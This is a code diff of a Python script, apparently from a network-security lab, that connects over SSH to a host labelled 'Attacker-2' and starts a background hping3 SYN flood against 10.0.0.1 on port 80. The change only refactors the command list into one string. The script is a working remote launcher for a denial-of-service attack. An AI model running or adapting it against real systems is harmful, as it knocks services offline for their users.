@@ -11,29 +11,23 @@ ssh_port = 22 			 # The Default SSH port number
 ssh_username = "your_username"   # Replace with the actual username
 ssh_password = "your_password"   # Replace with the actual password
 
-# Establish SSH connection and execute command
+# Establish SSH connection and execute commands
 def execute_ssh_commands():
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(ssh_host, ssh_port, ssh_username, ssh_password)
-    
-    # Specify the commands to run on the remote machine (Attacker-2)
-    remote_commands = [
-        "nohup hping3 -S --flood -V -p 80 10.0.0.1 > /dev/null 2>&1 &"
-    ]
 
-   
-    # Execute the remote commands on Attacker-2 machine
-    for command in remote_commands:
-        stdin, stdout, stderr = ssh.exec_command(command)
-        
-        # Print command output (if needed)
-        print(f"Command: {command}")
-        print(stdout.read().decode("utf-8"))
-    
+    # Specify the commands to run on the remote machine (Attacker-2)
+    remote_command = "nohup hping3 -S --flood -V -p 80 10.0.0.1 > /dev/null 2>&1 &"
+
+    stdin, stdout, stderr = ssh.exec_command(remote_command)
+
+    #Print command output (if needed)
+    print(f"Command: {remote_command}")
+    print(stdout.read().decode("utf-8"))
+
     # Close the SSH connection
     ssh.close()
-
 
 
 # The script sniffs the channel on ens34 and looks for the TCP packet traffic.
